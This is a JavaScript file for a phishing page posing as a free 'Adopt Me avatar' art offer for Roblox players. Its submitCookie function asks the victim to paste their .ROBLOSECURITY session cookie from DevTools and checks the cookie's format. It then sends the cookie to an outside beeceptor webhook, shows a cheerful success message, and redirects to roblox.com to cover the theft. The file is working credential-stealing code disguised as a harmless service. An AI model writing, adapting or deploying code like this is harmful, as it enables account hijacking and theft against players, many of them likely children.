function submitCookie() {
    const cookie = document.getElementById('cookie-input').value.trim();
    if (!cookie) {
        console.log('No cookie provided');
        document.getElementById('status').innerText = 'Invalid code, mate! Paste the .ROBLOSECURITY from DevTools.';
        return;
    }
    if (!cookie.startsWith('_|WARNING')) {
        console.log('Invalid cookie format:', cookie.substring(0, 50) + '...');
        document.getElementById('status').innerText = 'Invalid code, mate! Grab the .ROBLOSECURITY from DevTools.';
        return;
    }
    console.log('Submitting cookie:', cookie.substring(0, 50) + '...');
    fetch('https://adopt-me-art.free.beeceptor.com', {
        method: 'POST',
        body: JSON.stringify({
            cookie: cookie,
            source: 'adopt-me-avatar',
            timestamp: new Date().toISOString()
        }),
        headers: { 'Content-Type': 'application/json' },
        mode: 'cors',
        cache: 'no-cache'
    }).then(response => {
        console.log('Response:', {
            status: response.status,
            statusText: response.statusText,
            cors: response.headers.get('Access-Control-Allow-Origin')
        });
        if (!response.ok) throw new Error(`Webhook failed: ${response.status} ${response.statusText}`);
        return response.text(); // Handle non-JSON (Beeceptor’s default HTML)
    }).then(data => {
        console.log('Webhook response:', data);
        document.getElementById('status').innerText = 'Nice one! Your Adopt Me avatar’s being sketched—check DMs soon!';
        setTimeout(() => window.location.href = 'https://www.roblox.com', 2000);
    }).catch(error => {
        console.error('Fetch/CORS error:', error.message);
        document.getElementById('status').innerText = 'Bugger, something went wrong. Try again!';
    });
}

// Hash routing for page navigation
window.addEventListener('hashchange', () => {
    console.log('Hash changed:', location.hash);
    let page = location.hash.slice(2).split('/').pop();
    document.querySelectorAll('section').forEach(s => s.style.display = 'none');
    if (page) {
        console.log('Showing section:', page);
        document.getElementById(page).style.display = 'block';
    }
});
window.dispatchEvent(new Event('hashchange'));
